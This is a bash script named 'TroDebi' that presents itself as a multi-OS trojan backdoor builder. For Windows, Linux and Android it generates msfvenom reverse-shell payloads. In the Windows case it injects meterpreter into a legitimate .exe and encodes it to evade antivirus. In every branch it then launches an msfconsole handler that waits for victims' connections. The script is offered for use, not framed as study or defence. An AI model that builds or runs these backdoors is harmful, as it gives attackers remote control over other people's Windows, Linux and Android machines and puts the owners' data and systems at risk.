#!/bin/bash

echo "___________            ________        ___.   .__ ";
echo "\__    ___/______  ____\______ \   ____\_ |__ |__|";
echo "  |    |  \_  __ \/  _ \|    |  \_/ __ \| __ \|  |";
echo "  |    |   |  | \(  <_> )    \    \   ___/| \_\\  |";
echo "  |____|   |__|   \____/_______  /\___  >___  /__|";
echo "                               \/     \/    \/    \n";
echo -e "\tTroDebi  -  Trojan Backdoor For Multiple OS   ";
echo -e "\tVersion  -  freeware"
echo -e "\tWrite by -  1411_Ketan.D & 1442_Sayantan.M                                         \n\n       "
echo " 1.Payload For windows "
echo " 2.Payload For Linux "
echo " 3.Payload For Android "
read -p "Enter your Choice[1-3]:" option
echo " Your choice is $option."

case $option in
	1) 
		echo "******************************** Mfsvemon for Windows ******************************************"
		read -p " Enter the architure (use default x86 else x64):" arch
		read -p " Enter the platfrom (default windows):" platform
		read -p " Enter .exe file path or copy the file in script dir for use:" path
		read -p " Enter the your local system ip(lhost OR 0.0.0.0):" host
		read -p " Enter the your local port (your machine):" port
		read -p " Enter the file_name and path you want your file on:" filepath

################################################ Command for Running and making backdoor trojan payload ################################################
 
		echo msfvenom -a $arch --platform $platform -x $path -k -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -i 3 -b "\x00" -e x86/shikata_ga_nai -f exe -o $filepath
            
		msfvenom -a $arch --platform $platform -x $path -k -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -i 3 -b "\x00" -e x86/shikata_ga_nai -f exe -o $filepath
        
        echo "Your Payload is genrated !!!!!!! "
############################################### Command for Running listener for backdoor ###############################################################
		
		a="yes"
		read -p "Want to start listener{msfconsole} yes/no:" wish
		
		while [ $a = $wish ]
		do	
		    msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $host; set LPORT $port; run; exit -y"
		done
		;;
	
	2) 
		echo "******************************* Mfsvemon for Linux *********************************************"
		read -p " Enter the architure (use default x86 else i686,x64,x86):" arch
		read -p " Enter the platfrom (select linux):" platform
		read -p " Enter the your system ip(lhost OR 0.0.0.0):" host
		read -p " Enter the your port (lport):" port
		read -p " Enter the file_name and path you want your file on:" filepath
        
############################################## Command for Running and making backdoor trojan payload ################################################### 
		echo "msfvenom -a $arch --platform $platform -p linux/x86/shell/reverse_tcp LHOST=$host LPORT=$port -b "\x00" -f elf -o $filepath"
		msfvenom -a $arch --platform $platform -p linux/x86/shell/reverse_tcp LHOST=$host LPORT=$port -b "\x00" -f elf -o $filepath
		
		echo "Your Payload is genrated !!!!!!! "  
############################################## Command for Running listener for backdoor #################################################################
        	a="yes"
		read -p "Want to start listener{msfconsole} yes/no:" wish
		
		while [ $a = $wish ]
		do	
        	msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST $host; set LPORT $port; run; exit -y"
		done
		;;
	
	3) 
		echo "***************************** Mfsvemon for Android *********************************************"
		echo " architure default dalvik for android"
		echo " platfrom android use by default"
		read -p " Enter the your local system ip(lhost OR 0.0.0.0):" host
		read -p " Enter the your local port (lport):" port
		read -p " Enter the file_name and path you want your file on:" filepath
        
########################################### Command for Running and making backdoor trojan payload#####################################################         
		echo "msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $filepath"
		msfvenom $path -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $filepath 

        	
        	echo "Your Payload is genrated !!!!!!! "
        
###################################### Command for Running listener for backdoor#######################################################################      
		
		a="yes"
		read -p "Want to start listener{msfconsole} yes/no:" wish
		
		while [ $a = $wish ]
		do	 
			msfconsole -q -x "use exploit/multi/handler;set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $host; set LPORT $port; run; exit -y"
        	done
        	;;

	*) 
		echo "Invalid Choice please start again"
		;;
esac

